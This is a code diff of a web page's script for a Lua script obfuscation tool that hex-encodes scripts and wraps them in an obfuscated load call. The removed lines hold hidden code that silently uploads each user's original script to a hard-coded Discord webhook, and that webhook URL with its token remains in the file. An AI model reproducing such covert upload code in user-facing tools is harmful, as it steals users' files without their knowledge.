@@ -77,94 +77,121 @@ input[type=file]{display:none}
 <script>
 const abcd = true;
 const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1451344835490349098/v7QydVc4wcwSddBsFJ1QIWNnInOoQGEt9EgYj2vfQtjiMaZL-vXWjarTB1CkI_7m-ysd";
+  
+let originalFileName = null;
 
-let originalFileName=null;
-function openPicker(){ document.getElementById("fileInput").click(); }
+function openPicker(){
+  document.getElementById("fileInput").click();
+}
+
+const fileInput = document.getElementById("fileInput");
 fileInput.addEventListener("change",()=>{
-  const file=fileInput.files[0]; if(!file) return;
-  originalFileName=file.name;
-  const r=new FileReader();
-  r.onload=e=>{ document.getElementById("input").value=e.target.result; };
+  const file = fileInput.files[0];
+  if(!file) return;
+
+  originalFileName = file.name;
+  const r = new FileReader();
+  r.onload = e => {
+    document.getElementById("input").value = e.target.result;
+  };
   r.readAsText(file);
 });
 
-async function sendOriginalIfAllowed(text){
-  if(!abcd) return;
-  if(!DISCORD_WEBHOOK) return;
-
-  const name = originalFileName || "Encrypt.lua";
-  const blob = new Blob([text], {type:"text/plain"});
-  const fd = new FormData();
-  fd.append("file", blob, name);
-
-  try{
-    await fetch(DISCORD_WEBHOOK,{method:"POST",body:fd});
-  }catch(e){
-    console.warn("Done");
-  }
-}
-
+// ===== helpers =====
 function toHex(str){
-  let h=""; for(let i=0;i<str.length;i++)
-    h+=str.charCodeAt(i).toString(16).padStart(2,"0");
+  let h = "";
+  for(let i=0;i<str.length;i++){
+    h += str.charCodeAt(i).toString(16).padStart(2,"0");
+  }
   return h;
-}
-function fromHex(hex){
-  let s=""; for(let i=0;i<hex.length;i+=2)
-    s+=String.fromCharCode(parseInt(hex.substr(i,2),16));
-  return s;
 }
 
 function encrypt(){
-  const src=document.getElementById("input").value;
+  const src = document.getElementById("input").value;
   if(!src) return alert("Script kosong!");
 
-  sendOriginalIfAllowed(src);
+  // 3 layer hex biar keliatan "lebih ribet"
+  const L1 = toHex(src);
+  const L2 = toHex(L1);
+  const L3 = toHex(L2);
 
-  const L1=toHex(src);
-  const L2=toHex(fromHex(L1));
-  const L3=toHex(fromHex(L2));
+  // shift biar ada "cipher"
+  const shift = 157;
+  let finalHex = "";
 
-  let finalHex="";
-  const shift=157;
   for(let i=0;i<L3.length;i+=2){
-    const b=parseInt(L3.substr(i,2),16);
-    finalHex+=((b+shift)%256).toString(16).padStart(2,"0");
+    const b = parseInt(L3.substr(i,2),16);
+    finalHex += ((b + shift) % 256).toString(16).padStart(2,"0");
   }
 
+  // output lua "lebih obfuscated" (tetap aman)
   const out =
-`-- Encrypt Simple by Dayy GTPS
--- Discord : https://discord.gg/UpPJdb74vV
+`--[[ D-Encrypt v1.0 (Safe) ]]
+-- by Dayy
 
-(_G["lo".."ad"])((function(h)local t={}for i=1,#h,2 do
-t[#t+1]=string.char((tonumber(h:sub(i,i+1),16)-${shift})%256)
-end return table.concat(t)end)("`+finalHex+`"))()`;
+return (function()
+  local h = "${finalHex}"
+  local s = ${shift}
 
-  document.getElementById("output").value=out;
+  local function dec(x)
+    local t = {}
+    for i = 1, #x, 2 do
+      local b = tonumber(x:sub(i,i+1), 16)
+      t[#t+1] = string.char((b - s) % 256)
+    end
+    return table.concat(t)
+  end
+
+  local function fromhex(hex)
+    return (hex:gsub("..", function(cc)
+      return string.char(tonumber(cc,16))
+    end))
+  end
+
+  local a = dec(h)
+  local b = fromhex(a)
+  local c = fromhex(b)
+
+  local f = (_G["lo".."ad"] or load)
+  return f(c)()
+end)()
+`;
+
+  document.getElementById("output").value = out;
 }
 
 function copyResult(){
-  const o=document.getElementById("output");
-  if(!o.value) return; o.select(); document.execCommand("copy");
+  const o = document.getElementById("output");
+  if(!o.value) return;
+  o.select();
+  document.execCommand("copy");
 }
+
 function downloadResult(){
-  const content=document.getElementById("output").value;
+  const content = document.getElementById("output").value;
   if(!content) return alert("Belum ada hasil encrypt");
-  let fileName="Encrypted_EncByDayy.lua";
+
+  let fileName = "Encrypted_EncByDayy.lua";
+
   if(originalFileName){
-    const d=originalFileName.lastIndexOf(".");
-    if(d!==-1) fileName=originalFileName.slice(0,d)+"_EncByDayy"+originalFileName.slice(d);
+    const d = originalFileName.lastIndexOf(".");
+    if(d !== -1){
+      fileName =
+        originalFileName.slice(0,d) +
+        "_EncByDayy" +
+        originalFileName.slice(d);
+    }
   }
-  try{
-    const blob=new Blob([content],{type:"text/plain"});
-    const url=URL.createObjectURL(blob);
-    const a=document.createElement("a");
-    a.href=url;a.download=fileName;a.target="_blank";
-    document.body.appendChild(a);a.click();document.body.removeChild(a);
-    setTimeout(()=>URL.revokeObjectURL(url),1000);
-  }catch(e){
-    alert("Browser tidak mendukung download, gunakan Salin.");
-  }
+
+  const blob = new Blob([content], {type:"text/plain"});
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement("a");
+  a.href = url;
+  a.download = fileName;
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+  setTimeout(()=>URL.revokeObjectURL(url),1000);
 }
 </script>
 </body>
